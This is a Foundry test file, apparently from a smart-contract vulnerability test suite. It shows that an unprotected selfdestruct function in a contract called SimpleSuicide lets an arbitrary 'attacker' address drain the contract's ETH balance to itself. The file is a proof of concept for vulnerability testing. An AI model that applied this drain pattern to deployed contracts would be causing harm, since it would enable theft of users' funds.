// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_suicide.sol";

contract SimpleSuicideTest is Test {
    SimpleSuicide public simpleSuicide;
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy contract
        simpleSuicide = new SimpleSuicide();
        
        // Fund contract with 1 ETH
        vm.deal(address(simpleSuicide), 1 ether);
    }

    function test_anyoneCanSelfDestruct() public {
        console.log("--- BEFORE-Trigger State ---");
        // Record pre-attack state
        uint256 preContractBalance = address(simpleSuicide).balance;
        uint256 preAttackerBalance = attacker.balance;
        
        console.log("Contract balance          : %d wei", preContractBalance);
        console.log("Attacker balance          : %d wei", preAttackerBalance);

        console.log("--- Trigger: Attacker calls sudicideAnyone ---");
        // Execute attack
        vm.prank(attacker);
        simpleSuicide.sudicideAnyone();

        console.log("--- AFTER-Trigger State ---");
        // Record post-attack state
        uint256 postContractBalance = address(simpleSuicide).balance;
        uint256 postAttackerBalance = attacker.balance;

        console.log("Contract balance          : %d wei", postContractBalance);
        console.log("Attacker balance          : %d wei", postAttackerBalance);

        // Verify vulnerability conditions (focus on fund transfer only per EIP-6780)
        bool fundsDrained = (postContractBalance == 0);
        bool fundsStolen = (postAttackerBalance == preAttackerBalance + preContractBalance);
        bool vulnerabilityExists = fundsDrained && fundsStolen;

        // Final verdict with differential comparison
        if (vulnerabilityExists) {
            console.log("DIFFERENTIAL VERDICT: Funds transferred - Exploit successful");
            console.log("Vulnerability Exists: Anyone can drain contract funds via selfdestruct");
        } else {
            console.log("DIFFERENTIAL VERDICT: Funds not transferred - Exploit failed");
            if (!fundsDrained) console.log(" - Contract balance not drained (%d wei remains)", postContractBalance);
            if (!fundsStolen) console.log(" - Funds not transferred to attacker (expected gain: %d wei)", preContractBalance);
            console.log("Vulnerability not Exist: Funds protection works as intended");
        }

        // Assert vulnerability based on fund transfer only
        assertTrue(vulnerabilityExists, "Funds not drained by unauthorized access");
    }
}